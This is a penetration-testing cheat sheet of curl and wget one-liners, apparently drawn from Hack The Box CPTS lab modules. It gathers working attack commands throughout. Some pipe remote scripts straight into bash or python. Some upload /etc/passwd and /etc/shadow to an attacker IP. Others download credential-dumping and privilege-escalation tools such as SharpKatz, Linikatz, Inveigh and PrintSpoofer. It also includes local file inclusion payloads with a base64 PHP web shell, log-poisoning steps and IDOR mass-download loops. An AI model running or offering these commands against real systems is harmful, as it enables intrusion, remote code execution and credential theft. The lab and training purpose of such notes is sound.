# Curl / Wget / download

% curl, wget, download, file-transfer, cpts

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - find-extensions
#cat/ATTACK/FILE_TRANSFERT #cpts
```
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumération-de-la-version
#cat/ATTACK/FILE_TRANSFERT #cpts
Avoir la version permet de trouver des exploits

```
curl -IL <url>
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - certificats
#cat/ATTACK/FILE_TRANSFERT #cpts
L'analyse des certificats peut permettre leak des emails et nom de compagnie.

```
curl -s "https://crt.sh/?q=&output=json" | jq -r '.[]
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - fingerprinting
#cat/ATTACK/FILE_TRANSFERT #cpts
Banner grabbing

```
curl -I <url>
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - crawler
#cat/ATTACK/FILE_TRANSFERT #cpts
```
pip install scrapy --break-system-packages
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - crawler-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - crawler-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
unzip ReconSpider.zip
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - searching-for-stuff
#cat/ATTACK/FILE_TRANSFERT #cpts
```
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.198/Snaffler.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - web-download-with-wget-curl-and-bash
#cat/ATTACK/FILE_TRANSFERT #cpts
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - web-download-with-wget-curl-and-bash-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - web-download-with-wget-curl-and-bash-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - web-download-with-wget-curl-and-bash-4
#cat/ATTACK/FILE_TRANSFERT #cpts
```
cat <&3
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - fileless-attacks-using-linux
#cat/ATTACK/FILE_TRANSFERT #cpts
*Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.*

```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - fileless-attacks-using-linux-2
#cat/ATTACK/FILE_TRANSFERT #cpts
*Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.*

```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - web-upload
#cat/ATTACK/FILE_TRANSFERT #cpts
```
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - misc
#cat/ATTACK/FILE_TRANSFERT #cpts
```
wget 192.168.49.128:8000/filetotransfer.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - perl
#cat/ATTACK/FILE_TRANSFERT #cpts
```
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - vbscript
#cat/ATTACK/FILE_TRANSFERT #cpts
```
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - nginx
#cat/ATTACK/FILE_TRANSFERT #cpts
Upload using cURL

```
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - nginx-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Upload using cURL

```
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - exploitation
#cat/ATTACK/FILE_TRANSFERT #cpts
```
curl 'http://<url>:<port>/shell.php?cmd=id'
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - online-presence
#cat/ATTACK/FILE_TRANSFERT #cpts
- Regarder le certificat - [crt.sh](/C:/Users/htg/AppData/Local/Programs/Joplin/resources/app.asar/crt.sh "crt.sh") Comment trouver les sous-domaines avec crt.sh

```
curl -s https://crt.sh/\?q\=\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up
#cat/ATTACK/FILE_TRANSFERT #cpts
```
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
sudo mkdir -p /opt/oracle
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-4
#cat/ATTACK/FILE_TRANSFERT #cpts
```
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-5
#cat/ATTACK/FILE_TRANSFERT #cpts
```
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-6
#cat/ATTACK/FILE_TRANSFERT #cpts
```
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-7
#cat/ATTACK/FILE_TRANSFERT #cpts
```
export PATH=$LD_LIBRARY_PATH:$PATH
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-8
#cat/ATTACK/FILE_TRANSFERT #cpts
```
cd ~
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-9
#cat/ATTACK/FILE_TRANSFERT #cpts
```
git clone https://github.com/quentinhardy/odat.git
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-10
#cat/ATTACK/FILE_TRANSFERT #cpts
```
cd odat/
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-11
#cat/ATTACK/FILE_TRANSFERT #cpts
```
pip install python-libnmap
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-12
#cat/ATTACK/FILE_TRANSFERT #cpts
```
git submodule init
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-13
#cat/ATTACK/FILE_TRANSFERT #cpts
```
git submodule update
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-14
#cat/ATTACK/FILE_TRANSFERT #cpts
```
pip3 install cx_Oracle
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-15
#cat/ATTACK/FILE_TRANSFERT #cpts
```
sudo apt-get install python3-scapy -y
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-16
#cat/ATTACK/FILE_TRANSFERT #cpts
```
sudo pip3 install colorlog termcolor passlib python-libnmap
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-17
#cat/ATTACK/FILE_TRANSFERT #cpts
```
sudo apt-get install build-essential libgmp-dev -y
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-18
#cat/ATTACK/FILE_TRANSFERT #cpts
```
pip3 install pycryptodome asyncore
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - setting-up-19
#cat/ATTACK/FILE_TRANSFERT #cpts
```
python3 odat.py -h
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - to-xml-format
#cat/ATTACK/FILE_TRANSFERT #cpts
```
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - linikatz
#cat/ATTACK/FILE_TRANSFERT #cpts
[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz

```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - alternative-installation-of-python27
#cat/ATTACK/FILE_TRANSFERT #cpts
```
curl https://pyenv.run | bash
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - alternative-installation-of-python27-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - alternative-installation-of-python27-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
echo 'command -v pyenv >/dev/null | | export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - alternative-installation-of-python27-4
#cat/ATTACK/FILE_TRANSFERT #cpts
```
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - netcat---attack-host---sending-file-to-compromised-machine
#cat/ATTACK/FILE_TRANSFERT #cpts
Miscellaneous File Transfer Methods

```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - netcat---attack-host---sending-file-to-compromised-machine-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Miscellaneous File Transfer Methods

```
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - ncat---attack-host---sending-file-to-compromised-machine
#cat/ATTACK/FILE_TRANSFERT #cpts
Miscellaneous File Transfer Methods

```
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - coreftp-exploitation
#cat/ATTACK/FILE_TRANSFERT #cpts
Latest FTP Vulnerabilities

```
curl -k -X PUT -H "Host: <ip>" --basic -u <user>:<password> --data-binary "PoC." --path-as-is https://<ip>/../../../../../../whoops
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433
#cat/ATTACK/FILE_TRANSFERT #cpts
Subsequently, students need to transfer [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to the WEB01 machine, starting a Python web server from `Pwnbox`/`PMVPN`:

```
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Subsequently, students need to transfer [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to the WEB01 machine, starting a Python web server from `Pwnbox`/`PMVPN`:

```
python3 -m http.server PWNPO
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-4
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ python3 -m http.server 8000
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit
#cat/ATTACK/FILE_TRANSFERT #cpts
Students need to be able to use `PowerView` and `Kerbrute` from MS01. Using the redirected drive, files on the ParrotOS desktop will be accessible from MS01. Students will begin by first downloading these files to PwnBox

```
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - locate-a-configuration-file-containing-an-mssql-connection-string-what
#cat/ATTACK/FILE_TRANSFERT #cpts
Students need to run `Snaffler.exe` on MS01 to hunt for shares, however, first, it must be downloaded to Pwnbox and then transferred to the Parrot OS jump-box:

```
wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - locate-a-configuration-file-containing-an-mssql-connection-string-what-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Students need to run `Snaffler.exe` on MS01 to hunt for shares, however, first, it must be downloaded to Pwnbox and then transferred to the Parrot OS jump-box:

```
scp Snaffler.exe htb-student@STMIP:/home/htb-student/Desktop
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - locate-a-configuration-file-containing-an-mssql-connection-string-what-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/ATTACK/FILE_TRANSFERT #cpts
Students need to escalate privileges using [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe). Alternatively, students could also likely use `JuicyPotato`, `LonelyPotato`, `Ro

```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Students need to escalate privileges using [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe). Alternatively, students could also likely use `JuicyPotato`, `LonelyPotato`, `Ro

```
scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
shell-session
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - obtain-credentials-for-a-user-who-has-genericall-rights-over-the-domai
#cat/ATTACK/FILE_TRANSFERT #cpts
Students need to download `Inveigh.ps1` and transfer it over to MS01:

```
wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@STMIP:/home/htb-student/Desktop
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - obtain-credentials-for-a-user-who-has-genericall-rights-over-the-domai-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - the-power-of-hybrid-attacks
#cat/ATTACK/FILE_TRANSFERT #cpts
The effectiveness of hybrid attacks lies in their adaptability and efficiency. They leverage the strengths of both dictionary and brute-force techniques, maximizing the chances of cracking passwords, especially in scenar

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - checking-php-configurations
#cat/ATTACK/FILE_TRANSFERT #cpts
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest

```
curl "http://<ip>:<port>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - checking-php-configurations-2
#cat/ATTACK/FILE_TRANSFERT #cpts
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest

```
curl -s "http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini" -o phpini_b64.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - checking-php-configurations-3
#cat/ATTACK/FILE_TRANSFERT #cpts
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest

```
cat phpini_b64.txt | base64 -d | grep -v
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - remote-code-execution
#cat/ATTACK/FILE_TRANSFERT #cpts
Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`: http://&lt;SERVER_IP&gt;:&lt;PORT

```
curl -s 'http://<ip>:<port>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - input
#cat/ATTACK/FILE_TRANSFERT #cpts
Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we p

```
curl -s -X POST --data '' "http://<ip>:<port>/index.php?language=php://input&cmd=id" | grep uid
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - expect
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, the `extension=expect` directive is present in the configuration, which indicates the server is configured to attempt to load the `expect` extension. However, this doesn’t guarantee the extension is actual

```
curl -s "http://<ip>:<port>/index.php?language=expect://id" | grep uid
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - ftp
#cat/ATTACK/FILE_TRANSFERT #cpts
This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL, as fol

```
curl 'http://<ip>:<port>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-log-poisoning
#cat/ATTACK/FILE_TRANSFERT #cpts
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent`

```
echo -n "User-Agent: " > Poison
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-log-poisoning-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent`

```
curl -s "http://<ip>:<port>/index.php" -H @Poison
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-logsconfigurations
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, the scan returned over 60 results, many of which were not identified with the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, which shows us

```
curl http://<ip>:<port>/index.php?language=../../../../etc/apache2/apache2.conf
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-logsconfigurations-2
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/

```
curl http://<ip>:<port>/index.php?language=../../../../etc/apache2/envvars
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-logsconfigurations-3
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/

```
export APACHE_RUN_USER=www-data
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-logsconfigurations-4
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/

```
export APACHE_RUN_GROUP=www-data
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-logsconfigurations-5
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/

```
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-logsconfigurations-6
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/

```
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-logsconfigurations-7
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/

```
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - server-logsconfigurations-8
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/

```
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - content-type
#cat/ATTACK/FILE_TRANSFERT #cpts
The code sets the (`$type`) variable from the uploaded file's `Content-Type` header. Our browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - content-type-2
#cat/ATTACK/FILE_TRANSFERT #cpts
The code sets the (`$type`) variable from the uploaded file's `Content-Type` header. Our browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the

```
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine, students need to visit its website's root page and click on "Contact Us", where images can be uploaded: When students try to upload an image, it gets uploaded and displayed directly aft

```
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-4
#cat/ATTACK/FILE_TRANSFERT #cpts
```
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - exploit
#cat/ATTACK/FILE_TRANSFERT #cpts
To try and exploit the page, we need to identify the HTTP request method used by the web application. We can intercept the request in Burp Suite and examine it: <img width="813" height="182" src=":/06f27c6fca2145a5a47421

```
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - mass-enumeration
#cat/ATTACK/FILE_TRANSFERT #cpts
We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line, as follows:

```
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep ""
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - mass-enumeration-2
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, we were able to capture the document links successfully. We may now use specific bash commands to trim the extra parts and only get the document links in the output. However, it is a better practice to use

```
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - mass-enumeration-3
#cat/ATTACK/FILE_TRANSFERT #cpts
Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:

```
for link in $(curl -s "/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - mass-enumeration-4
#cat/ATTACK/FILE_TRANSFERT #cpts
Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:

```
wget -q <url>/$link
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - mass-enumeration-5
#cat/ATTACK/FILE_TRANSFERT #cpts
Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:

```
for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - mass-enumeration-6
#cat/ATTACK/FILE_TRANSFERT #cpts
Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:

```
curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - repeat-what-you-learned-in-this-section-to-get-a-list-of-documents-of-
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine and visiting its website's root webpage, students first need to intercept the request that retrieves documents: Students will notice that a POST request gets sent to `/documents.php`, al

```
for link in $(curl -s -X POST "/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}")
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - repeat-what-you-learned-in-this-section-to-get-a-list-of-documents-of--2
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine and visiting its website's root webpage, students first need to intercept the request that retrieves documents: Students will notice that a POST request gets sent to `/documents.php`, al

```
wget -q <url>$link
```

